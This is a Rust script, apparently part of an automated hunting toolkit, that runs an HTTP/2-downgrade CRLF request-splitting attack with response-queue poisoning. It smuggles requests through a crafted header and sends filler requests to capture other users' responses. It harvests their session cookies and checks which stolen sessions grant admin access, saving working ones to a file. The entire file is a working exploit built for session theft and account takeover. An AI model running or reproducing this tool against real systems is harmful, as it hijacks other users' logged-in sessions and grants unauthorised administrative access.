#!/usr/bin/env rust-script
//! name: h2split_rqp_catch
//! description: H2->H1 CRLF-split response-queue-poisoning catcher - arms a hungry smuggled `POST /post/comment` (over-long Content-Length) through the H2 downgrade CRLF injection, waits a gap, then sends a padded filler request on the SAME client connection so the front-end's upstream stays pinned and its mispaired responses land on our streams; every response's status, Location and Set-Cookie is captured, so a victim login 302 that carries a session cookie is kept instead of being reduced to a status code, and every captured session is verified against the admin path.
//! version: 1.0.0
//! args: <base-url> [--sink /post?postId=1] [--post-id 1] [--over 700] [--gap-ms 800] [--rounds 20] [--read-ms 1200] [--verify-path /admin] [--out JAR] [--selftest]
//! keywords: hunter, h2, http2, crlf, request-splitting, response-queue-poisoning, session-theft, filler, hpack
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::client::TlsStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const TAIL: usize = 23;

#[tokio::main]
async fn main() {
    let _ = rustls::crypto::ring::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let ok = frame(4, 1, 3, b"abcd").len() == 13;
        pi_rust_lib::report::success("h2split_rqp_catch", json!({"selftest": if ok {"ok"} else {"fail"}}), "run against the target").unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }
    let mut base = String::new();
    let mut mode = "complete".to_string();
    let mut sink = "/post?postId=1".to_string();
    let mut post_id = "1".to_string();
    let mut over = 700usize;
    let mut gap_ms = 800u64;
    let mut rounds = 20u32;
    let mut read_ms = 1200u64;
    let mut verify_path = "/admin".to_string();
    let mut out: Option<String> = None;
    let mut i = 0;
    while i < args.len() {
        let n = args.get(i + 1).cloned();
        match args[i].as_str() {
            "--mode" => { mode = n.unwrap_or(mode); i += 1; }
            "--sink" => { sink = n.unwrap_or(sink); i += 1; }
            "--post-id" => { post_id = n.unwrap_or(post_id); i += 1; }
            "--over" => { over = n.and_then(|v| v.parse().ok()).unwrap_or(over); i += 1; }
            "--gap-ms" => { gap_ms = n.and_then(|v| v.parse().ok()).unwrap_or(gap_ms); i += 1; }
            "--rounds" => { rounds = n.and_then(|v| v.parse().ok()).unwrap_or(rounds).max(1); i += 1; }
            "--read-ms" => { read_ms = n.and_then(|v| v.parse().ok()).unwrap_or(read_ms); i += 1; }
            "--verify-path" => { verify_path = n.unwrap_or(verify_path); i += 1; }
            "--out" => { out = n; i += 1; }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("h2split_rqp_catch", "missing base url", "h2split_rqp_catch <base-url> [--over 700]");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port().unwrap_or(443);
    match run(&host, port, &mode, &sink, &post_id, over, gap_ms, rounds, read_ms, &verify_path, out.as_deref()).await {
        Ok(v) => pi_rust_lib::report::success("h2split_rqp_catch", v, "captured session -> act on the admin panel").unwrap_or(()),
        Err(e) => {
            pi_rust_lib::report::failure("h2split_rqp_catch", &e, "check the base url / payload shape");
            std::process::exit(1);
        }
    }
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut o = Vec::with_capacity(9 + len);
    o.push((len >> 16) as u8);
    o.push((len >> 8) as u8);
    o.push(len as u8);
    o.push(ftype);
    o.push(flags);
    o.push((stream >> 24) as u8);
    o.push((stream >> 16) as u8);
    o.push((stream >> 8) as u8);
    o.push(stream as u8);
    o.extend_from_slice(payload);
    o
}

fn tls_config(alpn: &[&[u8]]) -> Arc<ClientConfig> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut cfg = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    cfg.alpn_protocols = alpn.iter().map(|p| p.to_vec()).collect();
    Arc::new(cfg)
}

async fn h2_connect(cfg: Arc<ClientConfig>, host: &str, port: u16) -> Result<TlsStream<TcpStream>, String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("sn: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    tls.write_all(PREFACE).await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(tls)
}

async fn send(
    tls: &mut TlsStream<TcpStream>,
    sid: u32,
    host: &str,
    path: &str,
    extra: Vec<(Vec<u8>, Vec<u8>)>,
) -> Result<(), String> {
    let mut h: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), b"GET".to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), host.as_bytes().to_vec()),
        (b":path".to_vec(), path.as_bytes().to_vec()),
    ];
    h.extend(extra);
    let block = hpack::Encoder::new().encode(h.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    tls.write_all(&frame(1, 0x5, sid, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

fn sess_of(set_cookie: &str) -> Option<String> {
    let idx = set_cookie.find("session=")?;
    let mut s = String::new();
    for c in set_cookie[idx + 8..].chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
            s.push(c);
        } else {
            break;
        }
    }
    if s.len() < 16 { None } else { Some(s) }
}

async fn read_one(tls: &mut TlsStream<TcpStream>, dec: &mut hpack::Decoder<'_>, target: u32, read_ms: u64) -> Value {
    let mut status: Option<String> = None;
    let mut location: Option<String> = None;
    let mut cookies: Vec<String> = Vec::new();
    let mut body_len = 0usize;
    let mut head = String::new();
    let mut ended = false;
    let idle = Duration::from_millis(read_ms.max(200));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, tls.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 && tokio::time::timeout(idle, tls.read_exact(&mut payload)).await.is_err() {
            break;
        }
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = tls.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = tls.flush().await;
                }
            }
            1 | 9 => {
                if let Ok(hs) = dec.decode(&payload) {
                    if sid == target {
                        for (n, v) in hs {
                            let name = String::from_utf8_lossy(&n).to_string();
                            let val = String::from_utf8_lossy(&v).to_string();
                            if name == ":status" {
                                status = Some(val.clone());
                            } else if name.eq_ignore_ascii_case("set-cookie") {
                                cookies.push(val.clone());
                            } else if name.eq_ignore_ascii_case("location") {
                                location = Some(val.clone());
                            }
                        }
                    }
                }
                if sid == target && flags & 0x1 != 0 {
                    ended = true;
                }
            }
            0 => {
                if sid == target {
                    body_len += payload.len();
                    if head.len() < 300 {
                        head.push_str(&String::from_utf8_lossy(&payload));
                    }
                    if flags & 0x1 != 0 {
                        ended = true;
                    }
                }
            }
            3 => {
                if sid == target {
                    ended = true;
                }
            }
            _ => {}
        }
        if ended {
            break;
        }
    }
    json!({"status": status, "location": location, "set_cookie": cookies, "body_len": body_len, "body_head": head.chars().take(160).collect::<String>()})
}

struct Resp {
    status: u16,
    body: String,
    headers: Vec<(String, String)>,
}

async fn h1(cfg: Arc<ClientConfig>, host: &str, port: u16, path: &str, cookie: Option<&str>) -> Result<Resp, String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("sn: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    let mut req = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nAccept: */*\r\nConnection: close\r\n");
    if let Some(c) = cookie {
        req.push_str(&format!("Cookie: {c}\r\n"));
    }
    req.push_str("\r\n");
    tls.write_all(req.as_bytes()).await.map_err(|e| format!("write: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    let mut buf = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(12), tls.read_to_end(&mut buf)).await;
    let text = String::from_utf8_lossy(&buf).to_string();
    let (h, b) = match text.split_once("\r\n\r\n") {
        Some((h, b)) => (h.to_string(), b.to_string()),
        None => (text.clone(), String::new()),
    };
    let mut lines = h.lines();
    let status = lines.next().and_then(|l| l.split_whitespace().nth(1)).and_then(|s| s.parse::<u16>().ok()).unwrap_or(0);
    let headers: Vec<(String, String)> = lines.filter_map(|l| l.split_once(':').map(|(k, v)| (k.trim().to_string(), v.trim().to_string()))).collect();
    Ok(Resp { status, body: b, headers })
}

fn extract_csrf(html: &str) -> Option<String> {
    let idx = html.find("name=\"csrf\" value=\"")? + "name=\"csrf\" value=\"".len();
    let end = html[idx..].find('"')? + idx;
    Some(html[idx..end].to_string())
}

#[allow(clippy::too_many_arguments)]
async fn run(
    host: &str,
    port: u16,
    mode: &str,
    sink: &str,
    post_id: &str,
    over: usize,
    gap_ms: u64,
    rounds: u32,
    read_ms: u64,
    verify_path: &str,
    out: Option<&str>,
) -> Result<Value, String> {
    let h1cfg = tls_config(&[b"http/1.1"]);
    let h2cfg = tls_config(&[b"h2"]);
    let budget: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(300.0);
    let start = std::time::Instant::now();
    let deadline = start + Duration::from_secs_f64((budget - 30.0).max(20.0));

    // seed: our own anonymous session + the comment form csrf
    let page = h1(h1cfg.clone(), host, port, sink, None).await?;
    let seed = page
        .headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("set-cookie"))
        .find_map(|(_, v)| sess_of(v))
        .unwrap_or_default();
    let csrf = extract_csrf(&page.body).ok_or("no csrf on the sink page")?;

    let mut own: Vec<String> = Vec::new();
    if !seed.is_empty() {
        own.push(seed.clone());
    }
    let mut rows: Vec<Value> = Vec::new();
    let mut sessions: Vec<String> = Vec::new();

    for r in 1..=rounds {
        if std::time::Instant::now() >= deadline {
            break;
        }
        // complete mode: a finished smuggled request leaves an extra response pending on
        // the front-end's pooled upstream connection (offset +1); the victim's next request
        // on that connection consumes it and its own response is stranded for our filler.
        // hungry mode: the smuggled POST blocks mid-body and swallows the victim's request.
        let (inject, pad_len) = if mode == "hungry" {
            let marker = format!("%23z{r}%23");
            let provided = format!(
                "csrf={csrf}&postId={post_id}&name=rqp&email=r%40r.test&website=http%3A%2F%2Fr.test&comment={marker}"
            );
            let cl = provided.len() + TAIL + over;
            let smuggled = format!(
                "POST /post/comment HTTP/1.1\r\nHost: {host}\r\nCookie: session={seed}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {cl}\r\n\r\n{provided}"
            );
            (format!("\r\n\r\n{smuggled}"), over + 400)
        } else {
            (
                format!("\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n"),
                16usize,
            )
        };

        let mut tls = match h2_connect(h2cfg.clone(), host, port).await {
            Ok(t) => t,
            Err(e) => {
                rows.push(json!({"round": r, "error": e}));
                continue;
            }
        };
        let mut dec = hpack::Decoder::new();
        if let Err(e) = send(&mut tls, 1, host, "/", vec![(b"x-arm".to_vec(), inject.into_bytes())]).await {
            rows.push(json!({"round": r, "error": e}));
            continue;
        }
        let arm = read_one(&mut tls, &mut dec, 1, read_ms).await;
        tokio::time::sleep(Duration::from_millis(gap_ms)).await;
        // padded filler on the SAME client connection: the upstream stays pinned and
        // whatever the front-end mispairs onto this connection lands on stream 3
        let pad = vec![b'P'; pad_len];
        let filler = match send(&mut tls, 3, host, "/", vec![(b"pad".to_vec(), pad)]).await {
            Ok(()) => read_one(&mut tls, &mut dec, 3, read_ms).await,
            Err(e) => json!({"error": e}),
        };
        // second filler: another draw from the same pinned upstream
        let filler2 = match send(&mut tls, 5, host, "/", vec![(b"pad".to_vec(), vec![b'Q'; pad_len])]).await {
            Ok(()) => read_one(&mut tls, &mut dec, 5, read_ms).await,
            Err(e) => json!({"error": e}),
        };
        drop(tls);

        for row in [&arm, &filler, &filler2] {
            for c in row["set_cookie"].as_array().cloned().unwrap_or_default() {
                if let Some(v) = c.as_str().and_then(sess_of) {
                    if !own.contains(&v) {
                        own.push(v.clone());
                        sessions.push(v);
                    }
                }
            }
        }
        let interesting = |row: &Value| {
            let st = row["status"].as_str().unwrap_or("");
            st != "200" || !row["set_cookie"].as_array().map(|a| a.is_empty()).unwrap_or(true)
        };
        rows.push(json!({
            "round": r,
            "arm": arm,
            "filler": filler,
            "filler2": filler2,
            "interesting": interesting(&filler) || interesting(&filler2) || interesting(&arm),
        }));
    }

    // verify every captured session against the admin path
    let mut verified: Option<Value> = None;
    let mut jar: Option<String> = None;
    let mut tested = 0u32;
    for v in sessions.iter() {
        if std::time::Instant::now() >= deadline || tested >= 40 {
            break;
        }
        tested += 1;
        if let Ok(r) = h1(h1cfg.clone(), host, port, verify_path, Some(&format!("session={v}"))).await {
            if r.status == 200 && !r.body.contains("only available if logged in as an administrator") {
                verified = Some(json!({"session": v, "status": r.status, "snippet": r.body.chars().take(300).collect::<String>()}));
                if let Some(p) = out {
                    let _ = std::fs::write(p, json!({ host: { "session": v } }).to_string());
                    jar = Some(p.to_string());
                }
                break;
            }
        }
    }

    let interesting_rows: Vec<&Value> = rows.iter().filter(|r| r["interesting"] == true).collect();
    Ok(json!({
        "host": host,
        "mode": mode,
        "sink": sink,
        "over": over,
        "gap_ms": gap_ms,
        "rounds_run": rows.len(),
        "interesting_count": interesting_rows.len(),
        "interesting": interesting_rows.iter().take(20).map(|r| (*r).clone()).collect::<Vec<Value>>(),
        "rows": rows,
        "sessions_captured": sessions,
        "tested": tested,
        "verified": verified,
        "jar": jar,
        "seed_session": seed,
    }))
}
